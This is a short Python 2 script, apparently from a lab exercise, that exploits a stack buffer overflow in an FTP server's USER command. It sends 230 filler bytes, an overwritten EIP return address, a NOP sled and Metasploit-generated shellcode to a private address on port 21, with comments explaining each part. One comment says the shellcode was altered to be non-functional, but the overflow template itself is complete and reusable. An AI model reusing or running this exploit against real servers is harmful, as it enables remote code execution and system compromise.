import socket

i = 230
#buf is generated by Metasploit
buf =  ""
buf += "\xdb\xd4\xd9\x74\x24\xf4\xb8\xc9\x9f\x36\x38\x5b\x2b" #sections of this variable have been changed and deleted to prevent being malicious
buf += "\xc9\xbb\x54\x31\x43\x18\x83\xc3\x04\x03\x43\xdd\x7d"
buf += "\xc3\x64\x35\xe3\x2c\x95\xc5\x64\xa4\x70\xf4\xa4\xd2"
buf += "\xf1\xaa\x14\x90\x54\x4a\xde\xf4\x4c\xd9\x92\xd0\x63"
buf += "\x6a\x18\x07\x4d\x6b\x31\x7b\xcc\xef\x48\xa8\x8e\xce"
buf += "\x82\xbd\x2f\x17\xfe\x4c\x7d\xc0\x74\xe2\x92\x65\xc0"
buf += "\x3f\x18\x35\xc4\x47\xfd\x8d\xe7\x69\x50\x86\xb1\xa8"
buf += "\x52\x4b\xca\xe0\x4c\x88\xf7\xbb\xe7\x7a\x83\x3d\x2e"
buf += "\xb3\x6c\x91\x0f\x7c\x9f\xeb\x48\xba\x40\x9e\xa0\xb9"
buf += "\xfd\x99\x76\xc0\xd9\x2c\x6d\x62\xa9\x97\x49\x93\x7e"
buf += "\x41\x19\x9f\xcb\x65\x45\x83\xca\xca\x1d\xbf\x40\xed"
buf += "\xd1\x36\x13\xca\xf5\x13\xc4\x73\xaf\xf9\xa6\x8c\xaf"
buf += "\xa2\x17\x29\xbb\x4e\x43\x40\xe6\x06\xa0\x69\x19\xd6"
buf += "\xae\xfa\x6a\xe4\x71\x51\xe5\x44\xf9\x7f\xf2\xab\xd0"
buf += "\x38\x6c\x52\xdb\x38\xa4\x90\x8f\x68\xde\x31\xb0\xe2"
buf += "\x1e\xbe\x65\x9e\x1b\x28\x8c\x04\x40\xa2\xf8\xad\x88"
buf += "\x95\xf7\x38\x6e\x89\x57\x6b\x3f\x69\x08\xcb\xef\x01"
buf += "\x42\xc4\xd0\x31\x6d\x0e\x79\xdb\x82\xe7\xd1\x73\x3a"
buf += "\xa2\xaa\xe2\xc3\x78\xd7\x24\x4f\x89\x27\xea\xb8\xf8"
buf += "\x3b\x1a\xd9\x02\xc4\xda\x70\x03\xae\xde\xd2\x54\x46"
buf += "\xdc\x03\x92\xc9\x1f\x66\xf0\x0e\xdf\xf7\x91\x65\xf9"
buf += "\x6d\x9e\x11\x15\x62\x1e\xe2\x43\xe8\x1e\x8a\x33\x48"
buf += "\x4d\xaf\x3c\x45\xe1\x7c\xa8\x66\x50\xd0\x7b\x0f\x5e"
buf += "\x0f\x4b\x90\xa1\x7a\xc8\xd7\x5e\xff\xea\x7f\x37\x02"
buf += "\xb2\x7f\xc7\x68\x30\x10\xaf\x67\x1f\xdf\x1f\x87\x8a"

try:
	badstr = "USER " + "A" * i + "\x11\xAC\x40\x77" + "\x90"*20 + buf + "\r\n" #command + "A"'s (placeholders) + memory location of EIP + nop sled + payload + 'enter' key
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("10.80.100.4", 21))
	sock.send(badstr)
	print sock.recv(2048)
except:
	print i
